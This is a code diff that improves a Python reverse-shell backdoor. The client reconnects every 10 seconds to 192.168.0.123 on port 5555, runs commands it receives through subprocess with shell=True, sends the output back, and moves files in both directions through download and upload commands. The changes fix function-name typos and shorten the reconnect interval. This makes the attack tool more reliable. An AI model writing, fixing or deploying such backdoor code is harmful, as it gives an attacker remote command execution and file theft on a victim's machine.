@@ -8,7 +8,7 @@ def reliable_send(data):
 	jsondata = json.dumps(data)
 	s.send(jsondata.encode())
 
-def reliable_rcv():
+def reliable_recv():
 	data = ''
 	while True:
 		try:
@@ -19,7 +19,7 @@ def reliable_rcv():
 
 def connection():
 	while True:
-		time.sleep(20)
+		time.sleep(10)
 		try:
 			s.connect(('192.168.0.123', 5555))
 			shell()
@@ -57,7 +57,7 @@ def shell():
 		elif command[:8] == 'download':
 			upload_file(command[9:])
 		elif command[:6] == 'upload':
-			donwload_file(command[7:])
+			download_file(command[7:])
 		else:
 			execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
 			result = execute.stdout.read() + execute.stderr.read()
